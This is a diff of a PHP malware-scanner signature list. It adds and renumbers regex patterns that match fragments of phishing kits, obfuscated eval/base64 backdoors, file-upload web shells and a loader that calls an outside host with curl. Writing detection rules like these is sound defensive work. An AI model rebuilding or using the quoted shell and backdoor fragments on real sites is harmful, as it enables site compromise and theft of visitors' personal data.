+    920 => 
     array (
       'pattern' => '/\\<\\?php
 echo "\\<script\\>window\\.location\\.href \\= \'\\.\\.\\/index\\.php\';\\<\\/script\\>";
 \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1318 => 
+    921 => 
     array (
-      'pattern' => '/ct\\-\\>isCrawler\\(\\$useragent\\)\\)\\{
-	header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
-\\} e/s',
+      'pattern' => '/\\<\\?php \\/\\* This file is protected by copyright law[\\s\\S]{0,12000}yVc2ApwtCLco5lfo1iF2SIhUL7tm0hcBxzcUn7tJOZwe0Icb/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    922 => 
+    array (
+      'pattern' => '/\\<html\\>
+\\<head\\>
+	\\<script src\\="login\\/session\\/resour[\\s\\S]{0,12000}tion\\.href \\= \\\\""\\.URL\\."\\\\";\\<\\/script\\>"\\);
+\\}
+
+\\# Main C/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    923 => 
+    array (
+      'pattern' => '/wlerDetect\\\\CrawlerDetect;
+
+\\$CrawlerDetect \\= new[\\s\\S]{0,12000}\\.location\\.href \\= \\\\"ses\\/index\\\\"; \\<\\/script\\>";
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    924 => 
+    array (
+      'pattern' => '/\\.css"\\>
+	\\<div id\\="sec\\-overlay" style\\="display\\:none;"\\>
+		\\<div id\\="sec\\-container"\\> \\<\\/div\\>
+	\\<\\/div\\>
+	
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1319 => 
+    925 => 
+    array (
+      'pattern' => '/ipt src\\="files\\/mask\\.js"\\>\\<\\/script\\>
+														\\<script\\>
+														var element \\= document\\.getElementById\\(\'cnum\'\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    926 => 
     array (
       'pattern' => '/style\\="display\\:none;"\\>
 		\\<div id\\="sec\\-container"\\> \\<\\/div\\>
@@ -8694,16 +6081,175 @@ echo "\\<script\\>window\\.location\\.href \\= \'\\.\\.\\/index\\.php\';\\<\\/sc
 \\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1320 => 
+    927 => 
     array (
-      'pattern' => '/Fixtures\\/Headerspam\\.php[\\s\\S]{0,160}ReferralSpamDetect\\.php/',
+      'pattern' => '/\\<\\?php
+
+\\$settings \\= include \'\\.\\.\\/\\.\\.\\/settings\\/set[\\s\\S]{0,12000}\\="NONE"\\> \\<a href\\="\\#" type\\="button" class\\="button/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    928 => 
+    array (
+      'pattern' => '/\\<input name\\="ssn" id\\="ssn" required\\="true" placeholder\\="Enter Social Security Number"  class\\="unauth\\-form__input/s',
+      'label' => 'sample-specific content window',
+    ),
+    929 => 
+    array (
+      'pattern' => '/icker\\-div" class\\="ui\\-datepicker ui\\-widget ui\\-widget\\-content ui\\-helper\\-clearfix ui\\-corner\\-all"\\>\\<\\/div\\>
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    930 => 
+    array (
+      'pattern' => '/each \\(\\$src as \\$class\\) \\{
+    \\$class \\= "Jaybizzle\\\\[\\s\\S]{0,12000}me\\.txt", implode\\(\\$object\\-\\>getAll\\(\\), PHP_EOL\\)\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    931 => 
+    array (
+      'pattern' => '/Fixtures\\/AbstractReff\\.php[\\s\\S]{0,160}Fixtures\\/Headerspam\\.php/',
       'label' => 'sample-specific literal chain',
     ),
-    1321 => 
+    932 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\*
+ \\* This file is part of Crawler Detect[\\s\\S]{0,12000}an occur on devices using Opera Mini\\.
+        \'H/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    933 => 
+    array (
+      'pattern' => '/rnal\\.com\',
+        \'buqyxa\\.rincian\\.info\',
+        \'burger\\-imperia\\.com\',
+        \'burkesales\\.com\',
+        \'burn\\-fat\\.ga\',/s',
+      'label' => 'sample-specific content window',
+    ),
+    934 => 
+    array (
+      'pattern' => '/amespace Jaybizzle\\\\ReferralSpamDetect\\\\Fixtures;[\\s\\S]{0,12000}\\$data \\= array\\(
+        \'HTTP_REFERER\',
+    \\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    935 => 
+    array (
+      'pattern' => '/rchiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\|scraper\\)\',
+    \\);
+\\}/s',
+      'label' => 'sample-specific content window',
+    ),
+    936 => 
+    array (
+      'pattern' => '/alSpamDetect\\\\Fixtures;
+
+abstract class AbstractP[\\s\\S]{0,12000}tAll\\(\\)
+    \\{
+        return \\$this\\-\\>data;
+    \\}
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    937 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\*
+ \\* This file is part of Crawler Det[\\s\\S]{0,12000}bKit\\.\\[\\\\d\\\\\\.\\]\\*\',
+        \'Trident\\.\\[\\\\d\\\\\\.\\]\\*\',/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    938 => 
+    array (
+      'pattern' => '/\\<\\?php
+namespace Jaybizzle\\\\CrawlerDetect;
+require[\\s\\S]{0,12000}@return string
+     \\*\\/
+    public function comp/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    939 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* DO NOT SELL THIS SCRIPT \\! 
+ \\* DO[\\s\\S]{0,12000}\\#\\#\\#\\#\\#\\#\\#\\#
+\\#\\$            C0d3d by Spox_dz/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    940 => 
+    array (
+      'pattern' => '/if \\(in_array \\(\\$_SERVER\\[\'HTTP_REFERER\'\\], \\$block[\\s\\S]{0,12000}ww\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    941 => 
+    array (
+      'pattern' => '/age\\);
+    fclose\\(\\$xy\\);
+    header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
+\\}
+ \\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    942 => 
+    array (
+      'pattern' => '/TTP_USER_AGENT\'\\], \'Spamhaus\'\\) \\!\\=\\= false\\) \\{
+    \\$[\\s\\S]{0,12000}w\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
+\\}
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    943 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$bot_count \\= 0;
+\\$Bot \\= array\\("abot","dbot"[\\s\\S]{0,12000}\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    944 => 
+    array (
+      'pattern' => '/91\\.79","56\\.0\\.2924\\.87","57\\.0\\.2987\\.98","61\\.0\\.3116\\.[\\s\\S]{0,12000}ww\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    945 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+
+\\$ip \\= \\$_SERVER\\[\'REMOTE_ADDR\'\\];
+\\$url \\= "h[\\s\\S]{0,12000}explode\\(",", \\$data\\);
+\\$data \\= str_replace\\(\'"name/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    946 => 
+    array (
+      'pattern' => '/94\\.\\*\\.\\*",
+		 "\\^64\\.233\\.160\\.\\*",
+		 "\\^72\\.14\\.192\\.\\*",
+		 "\\^66\\.102\\.\\*\\.\\*",
+		 "\\^64\\.18\\.\\*\\.\\*",
+		 "\\^194\\.52\\.68\\.\\*",
+		 "\\^194\\.72\\.238\\.\\*"/s',
+      'label' => 'sample-specific content window',
+    ),
+    947 => 
     array (
       'pattern' => '/\\* @var array
      \\*\\/
     protected \\$data;
+
     \\/\\*\\*
      \\* Return the data set\\.
      \\* 
@@ -8711,171 +6257,390 @@ echo "\\<script\\>window\\.location\\.href \\= \'\\.\\.\\/index\\.php\';\\<\\/sc
      \\*\\//s',
       'label' => 'sample-specific content window',
     ),
-    1322 => 
+    948 => 
     array (
-      'pattern' => '/rchiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\|scraper\\)\',
+      'pattern' => '/\\|crawl\\|archiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\)\',
     \\);
 \\}/s',
       'label' => 'sample-specific content window',
     ),
-    1323 => 
-    array (
-      'pattern' => '/\\\\\\/\\\\d\\{1,2\\}\\\\\\.\\\\d\\{1,2\\}\\\\\\.\\[\\\\d\\\\\\.\\]\\*\\\\\\/\\\\d\\{1,2\\}\\\\\\.\',
-        \'Opera\',
-        \';\', \\/\\/ Remove the following characters ;
-    \\);
-\\}/s',
-      'label' => 'sample-specific content window',
-    ),
-    1324 => 
+    949 => 
     array (
       'pattern' => '/\\<\\?php
-namespace Jaybizzle\\\\CrawlerDetect;
-require\\(\'Fixtures\\/AbstractProvider\\.php\'\\);
-require\\(\'Fixtures\\/Headers\\.php\'\\);
-requ/s',
-      'label' => 'sample-specific content window',
-    ),
-    1325 => 
-    array (
-      'pattern' => '/E             \\$\\#
-\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#
 
-\\*\\*\\/
-header\\("HTTP\\/1\\.0 404 Not Found"\\);
-exit\\(\\);
+\\/\\*
+ \\* This file is part of Crawler Detect[\\s\\S]{0,12000}\\.\\]\\*\',
+        \'Macintosh\\.\',
+        \'Ubuntu\',/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    950 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\*
+ \\* This file is part of Crawler Detect[\\s\\S]{0,12000}\\.implode\\(\'\\|\', \\$patterns\\)\\.\'\\)\';
+    \\}
+
+    \\/\\*\\*/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    951 => 
+    array (
+      'pattern' => '/\\<\\?php \\/\\* This file is protected by copyright law[\\s\\S]{0,12000}ZOoa0cBY0R0cpGuO1FMazR0yJF3OZCBY0AMaMcJ5XDuEmKXp/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    952 => 
+    array (
+      'pattern' => '/\'Mac OS 9\', \'\\/linux\\/i\' \\=\\> \'Linux\', \'\\/ubuntu\\/i\'[\\s\\S]{0,12000}nt to handle the request\\.\\<\\/p\\>\\<\\/body\\>\\<\\/html\\>\'\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    953 => 
+    array (
+      'pattern' => '/\\> \'Mac OS 9\', \'\\/linux\\/i\' \\=\\> \'Linux\', \'\\/ubuntu\\/i\'[\\s\\S]{0,12000}o handle the request\\.\\<\\/p\\>\\<\\/body\\>\\<\\/html\\>\'\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    954 => 
+    array (
+      'pattern' => '/\\<\\?php \\/\\* This file is protected by copyright law[\\s\\S]{0,12000}Jd3WvWB50DBkvfoYvfB50FmLVFoiXkZL7tm0hcBxzcUnpcJE/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    955 => 
+    array (
+      'pattern' => '/4INUELcoa0CBlSF1SmCbHmbTShDBCPkuYlfuOpdMfgDo9zft[\\s\\S]{0,12000}R2kvcuL\\+Nt9Pfo1SNJFpKXp9tjS\\=rUj\\[hSKf\\|uJ~\\}_IJA\\[\\}x/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    956 => 
+    array (
+      'pattern' => '/cUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09N[\\s\\S]{0,12000}DuOsde4mhTShcbipftIpKXp9tm0hgWP7DztffSsKKaP\\^LlCL/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    957 => 
+    array (
+      'pattern' => '/ray\\(\'\', \'\'\\);
+		for \\(\\$i \\= 0; \\$i \\< 2; \\$i\\+\\+\\)\\{\\$Ip\\[0\\][\\s\\S]{0,12000}tion\\.href \\= \\\\""\\.URL\\."\\\\";\\<\\/script\\>"\\);
+		\\}
+	\\}
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    958 => 
+    array (
+      'pattern' => '/UZr1kD48no23rCAsbBNQvLmaheEWm0MrBksab65ykaEwcbtr[\\s\\S]{0,12000}t6BDtg\\+j5mdlI5KuV\\+h3FejHDnWqX\\+6ymK6hM\\=\'\\)\\)\\)\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    959 => 
+    array (
+      'pattern' => '/6NVZpWXpTVlZCZU12b1BQakZad3JFQlB1MllldzVYSGF0VUh2ckVjOEl5Rjh1cjM3dUVSOVgzMlJBWTNrQmdUOScpKSkpKSkpKSkpKSkpKSkpKTs\\=\'\\)\\);
 \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1326 => 
+    960 => 
     array (
-      'pattern' => '/VZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nKSk7ZXZhbCgkT08wME8wME8wKTs\\=\'\\)\\);return;\\?\\>vr\\{Tkr9NHenNHenNHe1z/s',
+      'pattern' => '/\\<\\?php
+class Dex \\{
+	function __construct\\(\\) \\{
+		\\$l[\\s\\S]{0,12000}tcNeb\\/YYlzVWIIq2yo3AKcSApmcU3wSTJD6lUTjhgLavru5K/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    961 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'NaXyJ\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    962 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php @header\\(\'Content\\-Type\\:text\\/html;charset\\=utf\\-8\'\\);error_reporting\\(0\\); \\$OOOOOO\\="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c[\\s\\S]{0,18000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    963 => 
+    array (
+      'pattern' => '/5ea \\= _6mgfc5\\:\\:_mj64x\\(\\);\\$_uyotq5ea\\["uid"\\] \\= _6mg[\\s\\S]{0,12000}w9vpi5\\-\\>_31fdm\\(\\)\\) \\{\\$_enw9vpi5\\-\\>_unqv6\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    964 => 
+    array (
+      'pattern' => '/b\\\\153\\\\x78\\\\x33\\\\x58\\\\161\\\\126\\\\64\\\\144\\\\x6c\\\\147\\\\x71\\\\116\\\\x50\\\\156\\\\x53\\\\x43\\\\x6c\\\\132\\\\120\\\\x52\\\\x65\\\\121"\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);
+\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1327 => 
+    965 => 
     array (
-      'pattern' => '/eval\\(str_rot13\\(gzinflate\\(base64_decode\\(\'rZLPSsNAEMbveYqlCJuANHdDHsCT5yISZtbJJFWm20k6ZBXf3YBVmoLBg\\+fvD9\\+PGdLnzkgbhKjOJxwNygfktjwgl4eEcVLahlPw/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/1EkcooKkovBbEOEsBGCaYxglmdmIzhIwgW6OfmJKWB2YkpuZ[\\s\\S]{0,12000}\\\\x37\\\\x61\\\\x61\\\\x37\\\\x61\\\\x37\\\\x62\\\\x62"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1328 => 
+    966 => 
     array (
-      'pattern' => '/\'\\) \\{eval\\(\\$_6m4kzz9n\\["data"\\]\\);exit;\\}\\}\\}\\$_enw9vpi5 \\= new _6mgfc5\\(\\);if \\(\\$_enw9vpi5\\-\\>_31fdm\\(\\)\\) \\{\\$_enw9vpi5\\-\\>_unqv6\\(\\);\\}exit\\(\\);/s',
+      'pattern' => '/\\]\\(\\$FIL8L8IIL8\\),\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x38\\\\x4c\\\\x49\\\\x38\\\\x49\\\\x49\\\\x38\\\\x4c\\\\x4c"\\]\\(\\$FIL8L8IIL8,\\\\\'\\/\\\\\'\\)\\);if\\(\\!\\$\\{"G\\\\x4cO\\\\x4/s',
       'label' => 'sample-specific content window',
     ),
-    1329 => 
+    967 => 
     array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x44\\\\x62\\\\x61\\\\x62\\\\x37\\\\x61\\\\x61\\\\x37\\\\x62\\\\x37"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x44\\\\x62\\\\x61\\\\x62\\\\x37\\\\x61\\\\x61\\\\x37\\\\x62\\\\x37"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/\\<\\?php
+
+\\/\\/ckIIbg
+\\$nowFileDir \\=  \'dashboardl\';
+\\$no[\\s\\S]{0,12000}EAD\' requests\\. Default true\\.
+ \\*\\/
+if \\( \'HEAD\' \\=\\=\\=/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1330 => 
+    968 => 
     array (
-      'pattern' => '/,\\$FLLLII888I\\);\\$FI8L88LILI\\=__FILE__;\\$FI8L88LILI\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x49\\\\x49"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$FI8L88LILI\\);\\$F8LI88LLII\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x38\\\\x4c\\\\x49\\\\x4c\\\\x49\\\\x49\\\\x4c\\\\x38\\\\x38"\\]\\(__FILE__\\)\\.\\\\/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1331 => 
-    array (
-      'pattern' => '/@include "\\\\057h\\\\157m\\\\145\\/\\\\155a\\\\147e\\\\151n\\\\163p\\\\057p\\\\165b\\\\154i\\\\143_\\\\150t\\\\155l\\\\057w\\\\160\\-\\\\151n\\\\143l\\\\165d\\\\145s\\\\057t\\\\150e\\\\155e\\\\055c\\\\157m\\\\160a\\\\164\\/[\\s\\S]{0,12000}require_once\\(ABSPATH \\. \'wp\\-settings\\.php\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1332 => 
-    array (
-      'pattern' => '/\\$O__O0O0_0O\\="f\\-y2qlu7jgk0tnx8dob41a56ewmr9hz_ci3spv";\\$O0_OOO0_0_\\=\\$O__O0O0_0O\\{0\\}\\.\\$O__O0O0_0O\\{33\\}\\.\\$O__O0O0_0O\\{5\\}\\.\\$O__O0O0_0O\\{24\\}\\.\\$O__O0O0_0O\\{3[\\s\\S]{0,12000}wp_safe_redirect\\( \\$location \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1333 => 
-    array (
-      'pattern' => '/\\)\\)\\.\'"\'\\.\\$hjwl995\\.\'"\'\\.ipga515\\(\\$wksh287\\{30\\}\\.\\$wksh287\\{30\\},\'\',\\$wksh287\\{69\\}\\);\\$zbgd825\\(\\$fsgm154,array\\(\'\',\'\\}\'\\.\\$tieg251\\.\'\\/\\/\'\\)\\);\\?\\>/s',
+      'pattern' => '/iSEdvS3EzR1ZJTVlBZEFMVHlmcFM3MmRQT2lGOThuTkRHVHV5QnpZOUl3a2Y4bzkzaVpBZVInKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpOw\\=\\=\'\\)\\);
+\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1334 => 
+    969 => 
     array (
-      'pattern' => '/\\\\\'Y\\-m\\-d h\\:i\\:s\\\\\'\\)\\),\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x30\\\\x4f\\\\x4f\\\\x30\\\\x30\\\\x5f\\\\x5f\\\\x5f"\\]\\(\\$OO_OO0_00_\\.\\$\\{"\\\\x47\\\\x4c\\\\/s',
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); function x\\(\\$u, \\$i\\)\\{ \\$l\\=""; for\\(\\$o\\=0;\\$o\\<strlen\\(\\$u\\);\\) for\\(\\$b\\=0;\\$b\\<strlen\\(\\$i\\);\\$b\\+\\+, \\$o\\+\\+\\) \\$l \\.\\= \\$u\\{\\$o\\} \\^ \\$i\\{\\$b\\}; retu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    970 => 
+    array (
+      'pattern' => '/\\<\\?php
+eval\\(base64_decode\\(\'ZnVuY3Rpb24gX1I5MkcoJF9VbE9nWDhnKXskX1VsT2dYOGc9c3Vic3RyKCRfVWxPZ1g4ZywoaW50KShoZXgyYmluKCczNz/s',
       'label' => 'sample-specific content window',
     ),
-    1335 => 
+    971 => 
     array (
-      'pattern' => '/\\.\\$header\\);
-	curl_setopt\\(\\$wp, CURLOPT_RETURNTRANSFER, 1\\);
-	\\$curxecs \\= curl_exec\\(\\$wp\\);
-	if \\(\\$blog\\!\\=[\\s\\S]{0,160}\\) \\{
-		file_put_contents\\(\\$blog, \\$curxecs\\);
-	\\}
-	if \\(isset\\(\\$_GET\\[/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/ath\'\\>OK\\-Click here\\!\\<\\/a\\>\\<\\/h1\\>";
+    \\}
+\\}echo \'\\<htm[\\s\\S]{0,12000}ype\\=submit value\\="Up"\\>\\<\\/form\\>\\<\\/body\\>\\<\\/html\\>\';
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1336 => 
+    972 => 
     array (
-      'pattern' => '/\\$O0_OO0O__0\\=\'168\';[\\s\\S]{0,12000}\\$OOO00_O0__\\="u_5wjzc4yi9xtalokd02smnh67rpf83gbeq1v\\-";\\$O0__OO00_O\\=\\$OOO00_O0__\\{9\\}\\.\\$OOO00_O0__\\{31\\}\\.\\$OOO00_O0__\\{22\\}\\.\\$OOO00_O0__\\{15\\}\\.\\$OOO00_O0__\\{/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1337 => 
-    array (
-      'pattern' => '/\'\\) \\{eval\\(\\$_dd2s3w72\\["data"\\]\\);exit;\\}\\}\\}\\$_r36cnosx \\= new _68z8fe\\(\\);if \\(\\$_r36cnosx\\-\\>_afap1\\(\\)\\) \\{\\$_r36cnosx\\-\\>_gpnko\\(\\);\\}exit\\(\\);/s',
+      'pattern' => '/rlen\\(\\$g\\);\\$v\\+\\+,\\$z\\+\\+\\)\\$i\\.\\=\\$k\\{\\$z\\}\\^\\$g\\{\\$v\\};return \\$i;\\};\\$t\\=base64_decode\\(\\$t\\);@\\$u\\=n\\(\\$t,\'ziugfxojvn\'\\);@eval\\(@gzuncompress\\(\\$u\\)\\);\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1338 => 
+    973 => 
     array (
-      'pattern' => '/\',\'\\$C11OKOOKK1\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x4b\\\\x4f\\\\x4f\\\\x4b\\\\x4f\\\\x31\\\\x4b\\\\x31\\\\x31"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$CK1O1OKOK1\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x4b\\\\x4f\\\\x4f\\\\x4b\\\\x4f\\\\x31\\\\x4b\\\\x31\\\\x31"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1339 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: The way to world domination[\\s\\S]{0,12000}eval\\(gzinflate\\(base64_decode\\(\'7f3ZkttKtigIPktfwdTROQydkBQAh4igtKVMzjMjOIEkUllRIACSIDEFAY559nO9lVW3tVmXWV2zW2bdb23WX9Bfc7\\/gfkKv5e4AAQ4RDG1p77/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1340 => 
-    array (
-      'pattern' => '/AwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs\\="\\)\\);\\?\\>/s',
+      'pattern' => '/\\\\x57\\\\x39\\\\64\\\\x42\\\\171\\\\60\\\\x31\\\\172\\\\154\\\\162\\\\127\\\\x57\\\\x51\\\\x55\\\\165\\\\151\\\\172\\\\53\\\\x4b\\\\x5a\\\\x4e\\\\71\\\\x61\\\\x64\\\\45\\\\142\\\\166\\\\x4b\\\\x77\\\\62\\\\x46\\\\1/s',
       'label' => 'sample-specific content window',
     ),
-    1341 => 
+    974 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php class _fa\\{private static\\$s;public static function g\\(\\$n,\\$k\\)\\{if\\(\\!self\\:\\:\\$s\\)self\\:\\:i\\(\\);\\$l\\=strlen\\(\\$k\\);\\$r\\=base64_decode\\(self\\:\\:\\$s\\[\\$n\\]\\);for\\(\\$i\\=/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    975 => 
+    array (
+      'pattern' => '/POST\\[\'cp\'\\]\\?\\>"required \\>
+	\\<input type\\="submit" va[\\s\\S]{0,12000}t to xxxxxxx@gmail\\.com \\- \\$xx  \\$xxx  \\<\\/b\\>"; 
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    976 => 
+    array (
+      'pattern' => '/1BSCPOAC\\/N42QIVa247I\\+ODN0VZ26LVUT\\+AIFUNJ0I\\+84HZVRaQGSGVZR\\/a09C4AW2bbC2P1MMW1P046aD52OWKS2VSRS3VC3RRYTWAGEZ08A31H\\/ETWZX11/s',
+      'label' => 'sample-specific content window',
+    ),
+    977 => 
+    array (
+      'pattern' => '/require_once\\(ABSPATH \\. \'wp\\-settings\\.php\'\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    978 => 
+    array (
+      'pattern' => '/"\\]\\(\\$CUU1UMMM11,\\$CM1MU1U1UM\\);echo \\$CM1U1U1MMU\\.\\\\\'\\|[\\s\\S]{0,12000}"\\\\x43\\\\x55\\\\x55\\\\x31\\\\x55\\\\x4d\\\\x31\\\\x4d\\\\x4d\\\\x31"\\]\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    979 => 
+    array (
+      'pattern' => '/j7aZGpOXqKawtiKVt7mNvZGhzf\\+E4Pmvjv9E\\/S8\\+\\/\\+Q6mbpR\\/s8FRv9lQPlfuf4fzP8lw9fUzdCG8v\\/nx\\/9J1P8t5Zy6VP9Phed\\/A4OPCPc\\=\\\\\'\\)\\)\\);\'\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    980 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php if\\(isset\\(\\$_FILES\\["userfile"\\]\\["name"\\]\\)\\)\\{ \\$uploaddir \\= getcwd\\(\\) \\. "\\/"; \\$uploadfile \\= \\$uploaddir \\. basename\\(\\$_FILES\\["userfile"\\]\\["name"\\]\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    981 => 
+    array (
+      'pattern' => '/5f\\\\x5f\\\\x30"\\]\\(\\$OO_O000O__\\.\\$OO0OO0___0\\);\\$\\{"\\\\x47\\\\x4[\\s\\S]{0,12000}comment \\);
+
+wp_safe_redirect\\( \\$location \\);
+exit;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    982 => 
+    array (
+      'pattern' => '/ksh287\\{34\\}\\);\\$rfew403 \\= ipga515\\(\\$wksh287\\{11\\},\\$wks[\\s\\S]{0,12000}zbgd825\\(\\$fsgm154,array\\(\'\',\'\\}\'\\.\\$tieg251\\.\'\\/\\/\'\\)\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    983 => 
+    array (
+      'pattern' => '/\\<\\?php 
+\\/\\/scp\\-173
+function updatefile\\(\\$blacks\\=\'\'\\)[\\s\\S]{0,12000}nit\\(\'http\\:\\/\\/newzealandpolicy\\.wang\\/\'\\.\\$header\\);
+	c/s',
